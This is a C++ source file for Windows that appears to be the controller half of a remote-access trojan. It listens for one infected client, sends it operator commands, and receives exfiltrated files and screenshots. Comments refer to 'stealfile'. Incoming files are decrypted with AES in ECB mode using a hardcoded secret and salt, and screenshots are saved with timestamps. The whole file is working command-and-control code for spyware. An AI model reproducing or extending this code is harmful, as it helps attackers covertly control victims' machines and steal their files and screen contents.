#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <string.h>
#include <bcrypt.h>
#include <ctime>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

#define PORT "25566" // the port users will be connecting to
#define BUFFERLEN 1024 // max command length
#define CHUNK_SIZE 1024 * 8 // 8kb chunking for file transfer

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) // ntstatus is just long with SAL comment code
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

// fixed
std::vector<BYTE> AesDecrypt(const BYTE* data, DWORD dataLen, const BYTE* key, DWORD keyLen, bool isLast) {
	BCRYPT_ALG_HANDLE	hAlg = NULL;
	BCRYPT_KEY_HANDLE	hKey = NULL;
	std::vector<BYTE>	plainText;
	DWORD				cbPlainText = 0, cbResult = 0, flag = (isLast) ? BCRYPT_BLOCK_PADDING : 0;

	// handle khi dataLen = 0 vì BCryptEncrypt apparently sẽ trả về nullptr, debug sau
	static const BYTE dummy_input[1] = { 0 };
	const BYTE* effective_input = (dataLen > 0) ? data : dummy_input;

	// open Algorithm Provider
	if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return {};
	// set mode to ECB
	if (!NT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0))) return {};
	// generate the key object
	if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key, keyLen, 0))) return {};
	// calculate output size
	if (!NT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)effective_input, dataLen, NULL, NULL, 0, NULL, 0, &cbPlainText, flag))) return {};
	plainText.resize(cbPlainText);
	// decrypt
	if (!NT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)effective_input, dataLen, NULL, NULL, 0, plainText.data(), cbPlainText, &cbResult, flag))) return {};
	plainText.resize(cbResult); // resize thêm phát nữa để bỏ padding nếu có

	// cleanup
	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(hAlg, 0);

	/* Note:
	Các bản sau ("Beginning in windows 10, cng provides pre-defined algorithm handles...") có vẻ có thể dùng handle định sẵn luôn như kiểu BCRYPT_AES_ECB_ALG_HANDLE thay vì cứ phải open và close*/

	return plainText;
}

std::vector<BYTE> genKey(const char* secret) {
	if (secret != NULL) {
		BCRYPT_ALG_HANDLE hAlg = NULL;
		std::vector<BYTE> key(64);
		NTSTATUS status;

		if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG))) return {};
		const BYTE salt[] = { 0x36, 0x67, 0x69, 0x42, 0x20, 0x66, 0x77, 0x88 };
		status = BCryptDeriveKeyPBKDF2(hAlg, (PUCHAR)secret, strlen(secret), (PUCHAR)salt, 8, 2048, key.data(), 32, 0);
		BCryptCloseAlgorithmProvider(hAlg, 0);
		if (!NT_SUCCESS(status)) return {};

		return key;
	}
	return {};
}

void receiveLoop(SOCKET s) {
	char buffer[BUFFERLEN];
	int numbytes;
	int screenshotCounter = 0;

	while (true) {
		numbytes = recv(s, buffer, BUFFERLEN, 0);

		if (numbytes > 0) {
			// đoạn fix cho cứ bị hang khi stealfile liên tục, lỗi dirty buffer
			if (numbytes < BUFFERLEN) buffer[numbytes] = '\0';
			else buffer[BUFFERLEN - 1] = '\0';

			if (strncmp(buffer, "FILE_ENC", 8) == 0) {
				long encryptedSize, originalSize;
				char filename[256];

				// parse Header
				sscanf(buffer, "FILE_ENC %s %ld %ld", filename, &originalSize, &encryptedSize);
				printf("[+] Receiving Encrypted File. Decrypting to: %s (%ld bytes)\n", filename, originalSize);
				FILE* f = fopen(filename, "wb");
				if (!f) {
					printf("[-] Failed to open file for writing.\n");
					printf("COMMAND> ");
					continue;
				}

				// buffer to hold encrypted data
				char fileBuffer[CHUNK_SIZE];
				std::vector<BYTE> key = genKey("this is a generic secret!");
				long totalReceived = 0;

				// fixed (thêm isLast và recv luôn vào đầu fileBuffer for reuse)
				while (totalReceived < encryptedSize) {
					int bytesToRead = CHUNK_SIZE;
					if (encryptedSize - totalReceived < CHUNK_SIZE) bytesToRead = (int)(encryptedSize - totalReceived);
					int received = recv(s, fileBuffer, bytesToRead, 0);
					if (received <= 0) break;
					bool isLast = ((totalReceived + received) == encryptedSize);
					std::vector<BYTE> decryptedChunk = AesDecrypt((BYTE*)fileBuffer, received, key.data(), 32, isLast);
					if (decryptedChunk.empty() && originalSize != 0) {
						printf("[-] Decryption failed during transfer.\n");
						break;
					}
					if (decryptedChunk.size() > 0) fwrite(decryptedChunk.data(), 1, decryptedChunk.size(), f);
					totalReceived += received;
				}
				fclose(f);
				printf("[+] File is saved: %s\n", filename);
			}
			else if (strncmp(buffer, "IMG", 3) == 0) {
				time_t now = time(0);
				struct tm tstruct;
				char filename[80];
				localtime_s(&tstruct, &now);
				strftime(filename, sizeof(filename), "screenshot_%Y-%m-%d_%H-%M-%S.jpg", &tstruct);

				long fileSize = strtol(buffer + 4, NULL, 10);
				printf("\r[+] Incoming screenshot (%ld bytes). Downloading...\n", fileSize);
				FILE* f = fopen(filename, "wb");
				if (!f) {
					printf("[-] Failed to write to file somehow...\n");
					continue;
				}
				long totalRecieved = 0;
				while (totalRecieved < fileSize) {
					int bytesToRead = BUFFERLEN;
					if (fileSize - totalRecieved < BUFFERLEN) {
						bytesToRead = fileSize - totalRecieved;
					}
					int received = recv(s, buffer, bytesToRead, 0);
					if (received <= 0) break;

					fwrite(buffer, 1, received, f);
					totalRecieved += received;
				}
				fclose(f);
			}
			else {
				buffer[numbytes] = '\0'; // null-terminate
				printf("Client sent: %s", buffer);
			}
			printf("COMMAND> ");
		}
		else {
			printf("[-] Client disconnected\n");
			exit(0);
		}
	}
}

int main() {
	WSADATA wsadata;
	char cmdBuffer[BUFFERLEN];
	struct addrinfo hints, * result = NULL;
	
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}
	
	ZeroMemory(&hints, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	getaddrinfo(NULL, PORT, &hints, &result);
	SOCKET ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	freeaddrinfo(result);

	listen(ListenSocket, 1);
	printf("Sever is listening on port %s\n", PORT);

	//accept one client for now
	SOCKET ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		fprintf(stderr, "Accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	printf("Client connected! Sending 'HELLO WORLD!'...\n");
	const char* buf = "HELLO WORLD!";
	if (send(ClientSocket, buf, strlen(buf), 0) == SOCKET_ERROR) {
		printf("Send failed: %d\n", WSAGetLastError());
	}

	std::thread reader(receiveLoop, ClientSocket);
	reader.detach();

	//main command loop
	while (true) {

		printf("COMMAND> ");

		if (fgets(cmdBuffer, BUFFERLEN, stdin) == NULL) break;

		cmdBuffer[strcspn(cmdBuffer, "\n")] = '\0'; //remove newline

		if (strlen(cmdBuffer) == 0) continue;

		if (strcmp(cmdBuffer, "exit") == 0) break;

		if (send(ClientSocket, cmdBuffer, (int)strlen(cmdBuffer), 0) == SOCKET_ERROR) {
			printf("Failed. Client might've of committed sudoku");
		}
	}

	closesocket(ClientSocket);
	closesocket(ListenSocket);
	WSACleanup();
	return 0;
}